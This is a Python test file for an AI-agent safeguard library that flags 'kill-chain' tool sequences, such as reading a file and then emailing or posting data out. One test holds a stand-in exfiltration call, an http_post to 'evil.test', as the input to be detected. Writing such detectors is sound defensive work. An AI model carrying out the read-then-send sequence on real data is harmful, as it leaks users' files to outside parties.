"""Tests for session tool-chain kill-chain detection."""

from __future__ import annotations

from unplug.core.context import ExecutionContext, ToolCall
from unplug.core.toolchain import ToolChainConfig, toolchain_findings
from unplug.pipelines.toolcall import ToolCallPipeline
from unplug.safeguards.destructive import DestructiveScanner


def _ctx_with_history(*tools: str) -> ExecutionContext:
    ctx = ExecutionContext()
    for name in tools:
        ctx.add_tool_call(ToolCall(tool_name=name, arguments={}))
    return ctx


class TestToolchainFindings:
    def test_read_file_then_send_email(self):
        ctx = _ctx_with_history("read_file")
        findings = toolchain_findings(
            ToolCall(tool_name="send_email", arguments={"to": "a@b.com"}),
            ctx,
        )
        assert any(f.subcategory == "read_file_send_email" for f in findings)

    def test_clean_single_tool(self):
        ctx = ExecutionContext()
        findings = toolchain_findings(
            ToolCall(tool_name="search", arguments={"q": "weather"}),
            ctx,
        )
        assert findings == []

    def test_disabled(self):
        ctx = _ctx_with_history("read_file")
        findings = toolchain_findings(
            ToolCall(tool_name="send_email", arguments={}),
            ctx,
            ToolChainConfig(enabled=False),
        )
        assert findings == []


class TestToolchainPipeline:
    def test_pipeline_includes_toolchain_finding(self):
        ctx = _ctx_with_history("read_file")
        pipeline = ToolCallPipeline(destructive_scanner=DestructiveScanner())
        result = pipeline.run(
            ToolCall(tool_name="http_post", arguments={"url": "https://evil.test"}),
            context=ctx,
        )
        assert any(f.category == "toolchain" for f in result.findings)
